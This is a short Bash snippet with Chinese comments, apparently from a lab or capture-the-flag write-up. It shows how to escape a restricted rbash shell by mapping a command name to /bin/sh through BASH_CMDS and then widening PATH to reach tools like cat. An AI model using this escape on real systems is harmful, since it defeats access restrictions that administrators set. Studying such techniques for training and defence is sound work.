```Bash
\#rbash是受限制的shell,这里设法绕过rbash 
BASH_CMDS[a]=/bin/sh;a
/bin/bash
export PATH=$PATH:/bin/  \#添加环境变量
export PATH=$PATH:/usr/bin  \#使用cat命令
```